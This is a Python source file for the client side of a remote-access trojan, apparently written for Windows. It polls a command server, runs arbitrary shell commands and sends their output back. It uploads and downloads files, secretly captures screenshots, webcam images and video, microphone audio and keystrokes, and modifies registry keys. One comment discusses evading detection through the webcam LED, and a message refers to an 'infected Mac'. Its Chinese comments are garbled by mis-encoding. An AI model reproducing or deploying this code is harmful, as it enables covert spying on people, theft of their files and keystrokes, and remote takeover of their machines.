# coding: gb18030

import time
import os
import subprocess
import platform
import wave
from datetime import datetime
import pyaudio
import requests
import traceback
import tempfile
import socket
import cv2
import win32api
import win32con
from pynput.keyboard import Listener

if os.name == 'nt':
    from PIL import ImageGrab
else:
    import pyscreenshot as ImageGrab

import config


class Client(object):

    def __init__(self):
        self.platform = platform.system() + " " + platform.release()
        # self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        # print({'platform': self.platform, 'hostname': self.hostname})
        self.keylogs = ""
        # keylogs�����ڴ洢���̼�¼���ַ���
        self.flag = 0

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/hello',
                            json={'platform': self.platform, 'hostname': self.hostname})
        return req.text

    def send_output(self, output, command='', newlines=True):
        """ Send console output to server """
        if not isinstance(output, str):
            output = output.decode("gb18030")

        req = requests.post(config.SERVER + '/report',
                            json={'output': output + '\n', 'cmd': command})

    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        print("command:" + cmd)
        tmp = cmd.split(' ')
        try:
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            print(output)
            self.send_output(output, tmp[0])
        except Exception as exc:
            self.send_output(traceback.format_exc())


    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))


    def upload(self, file):
        """ Uploads a local file to the server """
        print("file entity path:" + file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(config.SERVER + '/upload',
                              files={'uploaded': open(file, 'rb')})
            else:
                pass
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            print(traceback.format_exc())

    def download(self, file, destination):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
           # destination = self.expand_path(destination)
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(config.SERVER + '/static/' + file, stream=True)
            print(file)
            print(destination)
            destination += '\\' + file
            print(destination)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            print(traceback.format_exc())
            self.send_output(traceback.format_exc())

    def screenshot(self):
        """ Takes a screenshot and uploads it to the server"""
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"

        if os.name != 'posix':
            screenshot = ImageGrab.grab()
            tmp_file.close()
            screenshot.save(screenshot_file)
        else:
            name = tmp_file.name + ".png"
            os.system("screencapture %s" % name)

        self.upload(screenshot_file)


    def camshot(self):
        # Notice: light of usage webcam gets turned on.
        # TODO: Find way to disable led-lamp or reduce amount of time.sleep as much as possible for less detection
        cam = cv2.VideoCapture(0)
        time.sleep(3)  # wait for camera to open up, so image isn't dark (less sleeping = darker image)
        ret, frame = cam.read()
        if not ret:
            return
        tmp_file = tempfile.NamedTemporaryFile()
        camshot_file = tmp_file.name + ".png"
        tmp_file.close()
        cv2.imwrite(camshot_file, frame)
        self.upload(camshot_file)

    def cameravideo(self):
        cap = cv2.VideoCapture(0)  # ������ͷ
        width = 1920
        height = 1080
        # Define the codec and create VideoWriter object
        # fourccΪ�ĸ��ַ�������ʾѹ��֡��codec
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        tmp_file = tempfile.NamedTemporaryFile()
        cameravideo_file = tmp_file.name + ".avi"
        out = cv2.VideoWriter(cameravideo_file, fourcc, 20.0, (width, height))
        print("Video recording...")
        start_time = datetime.now()
        while cap.isOpened():
            ret, frame = cap.read()
            if ret is True:
                if (datetime.now() - start_time).seconds == 5:  # ¼��5�����
                    break
                frame = cv2.resize(frame, (1920, 1080))
                # write the flipped frame
                out.write(frame)
            else:
                break
            key = cv2.waitKey(1)
            if key == ord("q"):
                break
        # Release everything if job is finished
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        print("Video created...")
        self.upload(cameravideo_file)

    def audiocatch(self):
        """�����ͻ���������˷�,¼�� 10 ����Ƶ,����Ϊoutput.wav,��upload"""
        chunk = 1024  # Record in chunks of 1024 samples ��������
        sample_format = pyaudio.paInt16  # 16 bits per sample ����λ��
        channels = 2  # ��������˫����
        fs = 44100  # һ�����ڶ������źŵĲɼ����� ������
        seconds = 10  # ¼������ ����¼�� 10 ��
        tmp_file = tempfile.NamedTemporaryFile()
        audiocatch_file = tmp_file.name + ".wav"
        audioFilename = audiocatch_file
        p = pyaudio.PyAudio()  # ʵ����
        print('Recording...')

        stream = p.open(format=sample_format,
                        channels=channels,
                        rate=fs,
                        frames_per_buffer=chunk,
                        input=True)
        frames = []  # �б����ڴ洢 frames
        # Store data in chunks for 10 seconds
        for i in range(0, int(fs / chunk * seconds)):
            data = stream.read(chunk)  # ��ȡchunk���ֽڣ�����data��
            frames.append(data)  # �б������ ��� data
        # Stop and close the stream
        stream.stop_stream()
        stream.close()
        # Terminate the PortAudio interface
        p.terminate()

        print('Finished recording...')
        # Save the recorded data as a WAV file
        wf = wave.open(audioFilename, 'wb')
        # ����������ز���
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframes(b''.join(frames))  # ת��Ϊ������д���ļ�
        wf.close()

        self.upload(audioFilename)

    def keyboardlog(self):

        tmp_file = tempfile.NamedTemporaryFile()
        audiocatch_file = tmp_file.name + ".txt"
        file_name = audiocatch_file
        fobj = open(file_name, 'w')
        start_time = datetime.now()  # ��ʼʱ��
        def on_press(key):
            self.keylogs += str(key) + " "
            #print(self.keylogs)
            if (datetime.now() - start_time).seconds > 5:  # ��¼7�����
                fobj.write(self.keylogs)
                fobj.close()
                self.flag += 1
                if self.flag == 1:
                    self.upload(file_name)
                os.kill()
                return

        with Listener(on_press=on_press, suppress=False) as listener:
            if (datetime.now() - start_time).seconds < 5 :
                listener.join()
            else:
                if fobj.isopen():
                    fobj.write(self.keylogs)
                    fobj.close()
                    self.keylogs = ""
                    return
                else:
                    return

    def show_proc(self):
        return self.runcmd('tasklist')

    def create_proc(self, cmd):
        return self.runcmd(cmd)

    def kill_proc(self, pid):
        return self.runcmd("taskkill /f /PID " + pid)

    def startkeylogger(self):
        "Starts logging every key pressed"
        def on_press(key):
            self.keylogs += str(key) + " "

        with Listener(on_press=on_press) as listener:
            listener.join()

    def getloggedkeys(self):
        self.send_output(self.keylogs)
        self.keylogs = ""
        if platform.system() == "Darwin":
            self.send_output("Keylogger on infected Mac currenly not supported")

    def add_reg(self):
        # ��SoftwareĿ¼��Ĭ�ϰ�ע����ڴ˴�
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'SOFTWARE', 0, win32con.KEY_ALL_ACCESS)
        # ��ѯkey�µ��������
        size = win32api.RegQueryInfoKey(key)[0]
        # ��������鿴�Ƿ�����Ѿ���ӵ������������ӵ���test
        result = False

        for i in range(size):
            # ��������try���������test�����ڵĻ������쳣
            try:
                if win32api.RegEnumKey(key, i) != 'test':
                    continue
                else:
                    result = True
                    break
            except:
                continue
        # ������ڶ�������
        if (~result):
            # �½�test����
            win32api.RegCreateKey(key, 'test')
            # ���丳ֵ
            win32api.RegSetValue(key, 'test', win32con.REG_SZ, 'G11-ע������')
            self.send_output("test items has been estabilished in HKEY_CURRENT_USER/SOFTWARE")
            # �ر�ע���
            win32api.RegCloseKey(key)
        else:
            # ��testĿ¼��ȡ����Ĭ��ֵ
            keywx = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software\\test', 0, win32con.KEY_ALL_ACCESS)
            info = win32api.RegQueryValue(keywx, '')
            print(type(info))
            self.send_output(info)
            # �ر�ע���
            win32api.RegCloseKey(keywx)

    def delete_reg(self):
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software', 0, win32con.KEY_READ)
        # ɾ�����test��
        win32api.RegDeleteKey(key, 'test')
        win32api.RegCloseKey(key)
        self.send_output('Delete Reg HKEY_CURRENT_USER/SOFTWARE/test Succeed!!!\n')

    def ie_reg_modify(self):
        # ����HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Internet Explorer����Ĭ��ֵ��Ϊpython
        key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,
                                  "SOFTWARE\\Microsoft\\Internet Explorer", 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSetValue(key, '', win32con.REG_SZ, 'python')
        # ���䡰Version������Ϊ7.0.2900.2180
        win32api.RegSetValueEx(key, 'Version', 0, win32con.REG_SZ, '7.0.2900.2180')
        win32api.RegCloseKey(key)
        self.send_output('IE Reg Modifly Succeed!!!\n')

    def disp_reg(self): #��ӡ���������������
        reg_root = win32con.HKEY_CURRENT_USER
        reg_path = r'console'
        reg_flags = win32con.WRITE_OWNER | win32con.KEY_WOW64_64KEY | win32con.KEY_ALL_ACCESS

        key = win32api.RegOpenKeyEx(reg_root, reg_path, 0, reg_flags)
        tmp = reg_path + "������" + str((win32api.RegQueryInfoKey(key))[0]) + "��"
        self.send_output(tmp)

        for item in win32api.RegEnumKeyEx(key):
            # print(item)
            self.send_output(str(item))

    def handle_enter(self, args):
        filename = args[0]
        self.runcmd('dir '+ filename)



    def run(self):
        """ Main loop """
        while True:
            try:
                time.sleep(1)
                todo = self.server_hello()
                # Something to do ?
                if todo != "":
                    #print(todo)
                    commandline = todo
                    self.send_output('$ ' + commandline + '\n')
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    print("command:"+command)
                    for ch in command:
                        print('%x ' % ord(ch), end='')
                    if command == 'upload':     # �ϴ��ļ�
                        self.upload(args[0])
                    elif command == 'download': # �����ļ�
                        print(args)
                        self.download(args[0], args[1])
                    elif command == 'screenshot': # ��Ļ��ͼ
                        self.screenshot()
                    elif command == 'camshot':  # ����ͷ����
                        self.camshot()
                    elif command == 'cam_video':    # ����ͷ¼��
                        self.cameravideo()
                    elif command == 'show_proc':    # ��ӡ���ض˵�ǰ���̱�
                        print("in")
                        self.show_proc()
                    elif command == 'create_proc':  # �ڱ��ض˴򿪽���calc
                        self.create_proc("calc")
                    elif command == 'kill_proc':  # �ڱ��ض˴򿪽���calc
                        self.kill_proc(args[0])
                    elif command =='audiocatch':    # ��ȡ��Ƶ
                        self.audiocatch()
                    elif command == 'keylogger':    # ����̼�¼
                        self.keyboardlog()
                    elif command == 'add_reg':  # ��ָ��λ�����ע�����
                        self.add_reg()
                    elif command == 'ie_reg_modify':    # �޸�IE�����ע�����
                        self.ie_reg_modify()
                    elif command == 'delete_reg':   # ɾ��ָ��λ��ע�����
                        self.delete_reg()
                    elif command == 'disp_reg': # ��ӡĳһλ����������
                        self.disp_reg()
                    elif command == 'cd':   # �����ϲ�Ŀ¼
                        self.runcmd("dir ..")
                    elif command == 'enter':  # �����ϲ�Ŀ¼
                        self.handle_enter(args)
                    else:                   # ����ָ��ִ��
                        self.runcmd(commandline)
                else:
                    pass
            except Exception as exc:
                print(traceback.format_exc())

def main():
    agent = Client()
    agent.run()


if __name__ == "__main__":
    main()
